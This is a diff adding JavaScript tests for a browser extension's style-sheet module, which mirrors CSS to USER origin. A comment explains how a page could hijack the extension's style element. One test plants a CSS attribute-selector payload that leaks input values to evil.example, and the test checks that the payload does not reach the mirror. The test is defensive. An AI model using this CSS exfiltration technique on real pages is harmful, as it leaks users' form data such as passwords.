@@ -478,3 +478,85 @@ test('ordinary custom property names still make it through', () => {
     assert.ok(css.includes(`${name}:`), `${name} should still be remapped: ${css}`);
   }
 });
+
+// --- what gets mirrored to USER origin -------------------------------------
+
+/** Enough DOM for sheet.js: a head that holds style elements. */
+function stubDocument() {
+  const head = { childNodes: [] };
+  head.appendChild = (el) => {
+    if (el.parentNode) el.parentNode.removeChild(el);
+    head.childNodes.push(el);
+    el.parentNode = head;
+    el.isConnected = true;
+    return el;
+  };
+  head.removeChild = (el) => {
+    head.childNodes = head.childNodes.filter((c) => c !== el);
+    el.parentNode = null;
+    el.isConnected = false;
+  };
+  return {
+    head,
+    documentElement: head,
+    createElement: () => ({
+      textContent: '',
+      media: '',
+      isConnected: false,
+      parentNode: null,
+      attrs: {},
+      setAttribute(name, value) {
+        this.attrs[name] = value;
+      },
+      hasAttribute(name) {
+        return name in this.attrs;
+      },
+    }),
+    querySelectorAll: () => head.childNodes,
+    styleSheets: [],
+  };
+}
+
+test('the text mirrored to USER origin is ours, not whatever is in the element', () => {
+  /*
+   * The stubborn-sites mirror is the same declarations re-inserted at USER
+   * origin, which outranks everything the page can write for itself and is
+   * not subject to the page's own content security policy. Reading the text
+   * back off the injected element let the page choose it: overwrite the
+   * textContent of one of our own style elements and the next sync hands that
+   * to the worker to insert at that origin. A page could reach its own
+   * document in a way it otherwise cannot, and CSS can address attribute
+   * values and fetch a background image from them.
+   *
+   * The sheet knows what it was asked to write, so that is what it reports.
+   */
+  const NX = loadLibs(['color', 'theme', 'signals', 'content/sheet'], {
+    document: stubDocument(),
+  });
+
+  NX.sheet.set('computed', '[data-nx="0"]{color:rgb(1, 2, 3)}');
+  NX.sheet.set('filter', 'html{filter:invert(1)}');
+  assert.ok(NX.sheet.ours().includes('[data-nx="0"]'), NX.sheet.ours());
+  assert.ok(NX.sheet.ours().includes('invert(1)'), NX.sheet.ours());
+
+  // The page rewrites one of our sheets in place.
+  const hijacked = NX.sheet.elements.get('filter');
+  hijacked.textContent = 'input[value^="a"]{background:url(https://evil.example/a)}';
+
+  const mirrored = NX.sheet.ours();
+  assert.ok(!mirrored.includes('evil.example'), `page text reached the mirror: ${mirrored}`);
+  assert.ok(mirrored.includes('invert(1)'), mirrored);
+});
+
+test('a removed sheet stops being mirrored', () => {
+  const NX = loadLibs(['color', 'theme', 'signals', 'content/sheet'], {
+    document: stubDocument(),
+  });
+  NX.sheet.set('tokens', ':root{--a:rgb(0, 0, 0)}');
+  NX.sheet.set('filter', 'html{filter:invert(1)}');
+  NX.sheet.remove('tokens');
+  assert.ok(!NX.sheet.ours().includes('--a'), NX.sheet.ours());
+
+  NX.sheet.clearAll();
+  assert.equal(NX.sheet.ours(), '');
+});
